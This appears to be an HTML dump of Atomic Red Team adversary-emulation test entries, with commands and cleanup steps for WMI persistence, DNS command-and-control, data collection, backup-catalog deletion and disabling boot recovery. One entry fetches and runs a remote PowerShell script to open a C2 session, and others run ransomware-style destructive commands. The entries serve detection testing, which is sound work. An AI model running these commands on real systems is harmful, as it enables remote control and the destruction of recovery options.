<li><strong>command</strong>: $FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 325"};
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs</li>
</ul>
<p>$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';
                CommandLineTemplate="$($Env:SystemRoot)\System32\notepad.exe";}
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs</p>
<p>$FilterToConsumerArgs = @{
Filter = [Ref] $Filter;
Consumer = [Ref] $Consumer;
}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs</p>
<ul>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'"
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'"
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue
$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1546.003</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: fecd0dfd-fb55-45fa-a10b-6250272d0832</li>
<li><strong>name</strong>: Persistence via WMI Event Subscription - ActiveScriptEventConsumer</li>
<li><strong>description</strong>: Run from an administrator powershell window. After running, reboot the victim machine.
After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.</li>
</ul>
<p>Code references</p>
<p>https://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: $FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 325"};
$Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $FilterArgs</li>
</ul>
<p>$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
                ScriptingEngine='VBScript';
                ScriptText='
                Set objws = CreateObject("Wscript.Shell")
                objws.Run "notepad.exe", 0, True
                '}
$Consumer=Set-WmiInstance -Namespace "root\subscription" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs</p>
<p>$FilterToConsumerArgs = @{
Filter = $Filter;
Consumer = $Consumer;
}
$FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs</p>
<ul>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class ActiveScriptEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'"
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'"
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue
$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1546.003</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: e7bf9802-2e78-4db9-93b5-181b7bcd37d7</li>
<li><strong>name</strong>: DNS C2</li>
<li><strong>description</strong>: This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.
The following blogs have more information.</li>
</ul>
<p>https://github.com/iagox86/dnscat2</p>
<p>https://github.com/lukebaggett/dnscat2-powershell</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1071.004</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: {'description': 'IP address of DNS server where your C2 listener is running', 'type': 'string', 'default': '127.0.0.1'}</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: {'description': 'Domain Name configured to use DNS Server where your C2 listener is running', 'type': 'string', 'default': 'example.com'}</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 634bd9b9-dc83-4229-b19f-7f83ba9ad313</li>
<li><strong>name</strong>: Automated Collection PowerShell</li>
<li>
<p><strong>description</strong>: Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_powershell_collection
to see what was collected.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: New-Item -Path $env:TEMP\T1119_powershell_collection -ItemType Directory -Force | Out-Null
Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\T1119_powershell_collection}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item $env:TEMP\T1119_powershell_collection -Force -ErrorAction Ignore | Out-Null</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1119</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: c3f6d794-50dd-482f-b640-0384fbb7db26</li>
<li><strong>name</strong>: Recon information for export with PowerShell</li>
<li>
<p><strong>description</strong>: collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt
to see what was collected.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Get-Service &gt; $env:TEMP\T1119_1.txt
Get-ChildItem Env: &gt; $env:TEMP\T1119_2.txt
Get-Process &gt; $env:TEMP\T1119_3.txt</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item $env:TEMP\T1119_1.txt -ErrorAction Ignore
Remove-Item $env:TEMP\T1119_2.txt -ErrorAction Ignore
Remove-Item $env:TEMP\T1119_3.txt -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1119</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 263ba6cb-ea2b-41c9-9d4e-b652dadd002c</li>
<li><strong>name</strong>: Windows - wbadmin Delete Windows Backup Catalog</li>
<li>
<p><strong>description</strong>: Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,
"The backup catalog has been successfully deleted." will be displayed in the PowerShell session.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: wbadmin delete catalog -quiet</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1490</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: cf21060a-80b3-4238-a595-22525de4ab81</li>
<li><strong>name</strong>: Windows - Disable Windows Recovery Console Repair</li>
<li>
<p><strong>description</strong>: Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
Upon execution, "The operation completed successfully." will be displayed in the powershell session.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
bcdedit.exe /set {default} recoveryenabled no</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures &gt;nul 2&gt;&amp;1
bcdedit.exe /set {default} recoveryenabled yes &gt;nul 2&gt;&amp;1</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1490</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
